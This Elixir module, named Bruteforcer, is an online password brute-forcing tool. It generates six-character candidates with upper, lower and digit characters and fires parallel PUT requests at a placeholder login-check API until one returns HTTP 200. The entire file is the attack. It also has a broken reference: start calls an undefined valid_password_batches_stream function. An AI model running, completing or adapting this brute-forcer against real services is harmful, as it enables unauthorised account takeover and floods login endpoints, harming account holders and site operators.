defmodule Bruteforcer do
  @moduledoc """
  Documentation for Bruteforcer.
  """

  @doc """
  Hello world.

  ## Examples

      iex> Bruteforcer.hello()
      :world

  """

  def start do
    start = System.monotonic_time(:millisecond)
    result = valid_password_batches_stream()
      |> Stream.take(1000)
      |> Flow.from_enumerable(max_demand: 1, stages: 16)
      |> Flow.map(&request_server_in_parallel(&1))
      |> Enum.find_value({:fail}, fn batch_result ->
        case batch_result do
          {:ok, _ } -> batch_result
          _ -> false
        end
      end)

    time_spent = System.monotonic_time(:millisecond) - start
    IO.inspect time_spent
    result
  end

  def passwords_stream do
    password_combinations()
      |> Stream.filter(&password_validation(&1))
      |> Stream.transform(0, fn(pwd, acc) ->
        acc = acc + 1
        percents = Float.round(acc * 100 / 1500000000, 3)
        {[pwd], acc}
      end)
  end

  def request_server_in_parallel(chunk) do
    chunk
      |> Enum.map(fn pwd -> Task.async(fn -> request_server(pwd) end) end)
      |> Enum.map(&Task.await(&1))
      |> Enum.find_value({ :fail }, fn result ->
        case result do
           {:ok, _} -> result
            _ -> false
        end
      end)
  end

  def request_server(password) do
    body = Poison.encode!(%{email: "", password: password})
    result = HTTPoison.put!("https://website/api/session/check", body, [{"Content-Type", "application/json"}])
    case result.status_code do
        200 -> { :ok, password }
        _ -> { :fail, password }
    end
  end

  defp password_combinations do
    str = [
      Permutations.variants(),
      Permutations.variants(),
      Permutations.variants(),
      Permutations.variants(),
      Permutations.variants(),
      Permutations.variants()
    ]
    Permutations.combinations(str, [])
  end

  def password_validation(password) do
    String.match?(password, ~r/.*([a-z]{1,}).*$/) &&
      String.match?(password, ~r/^.*([A-Z]{1,}).*$/) &&
      String.match?(password, ~r/^.*([\d]{1,}).*$/)
  end
end
